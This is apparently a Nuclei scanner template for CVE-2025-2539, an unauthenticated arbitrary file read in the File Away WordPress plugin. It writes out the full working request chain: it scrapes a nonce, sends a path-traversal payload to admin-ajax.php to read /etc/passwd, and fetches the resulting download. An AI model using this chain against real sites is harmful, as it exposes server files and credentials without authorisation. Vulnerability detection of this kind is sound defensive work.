flow: http(1) && http(2) && http(3)
http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    regex:
    - fileaway_stats.*admin-ajax.php","nonce":"([0-9a-zA-Z]+)"}
    type: regex
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: download_url
    part: body
    regex:
    - '".*(\?.*?)"'
    type: regex
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - fileaway_download
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=fileaway-stats&nonce={{nonce}}&file=/../../../../../../../../etc/passwd

    '
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - part: content_type
    type: word
    words:
    - application/force-download
  matchers-condition: and
  raw:
  - 'GET /{{download_url}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2025-2539
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2025-2539
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-327
    epss-percentile: 0.9542
    epss-score: 0.20811
  description: 'The File Away plugin for WordPress is vulnerable to unauthorized access
    of data due to a missing capability check on the ajax() function in all versions
    up to, and including, 3.9.9.0.1. This makes it possible for unauthenticated attackers,
    leveraging the use of a reversible weak algorithm,  to read the contents of arbitrary
    files on the server, which can contain sensitive information.

    '
  impact: 'Unauthenticated attackers can exploit weak encryption and missing authorization
    to read arbitrary files from the server, potentially exposing sensitive documents,
    configuration files, and user data.

    '
  metadata:
    max-request: 1
    publicwww-query: /wp-content/plugins/file-away/
    verified: true
  name: File Away <= 3.9.9.0.1 - Missing Authorization to Unauthenticated Arbitrary
    File Read
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-away/file-away-39901-missing-authorization-to-unauthenticated-arbitrary-file-read
  - https://plugins.trac.wordpress.org/browser/file-away/trunk/lib/cls/class.fileaway_encrypted.php
  - https://plugins.trac.wordpress.org/browser/file-away/trunk/lib/cls/class.fileaway_stats.php
  - https://wordpress.org/plugins/file-away/#developers
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/5b23bd5c-db27-4d63-8461-1f36958a2ff6?source=cve
  remediation: 'Upgrade to File Away version 3.9.9.1 or later that implements proper
    capability checks and stronger encryption.

    '
  severity: high
  tags: cve,cve2025,lfi,file-away,wordpress,wp-plugin,wp,vkev,vuln
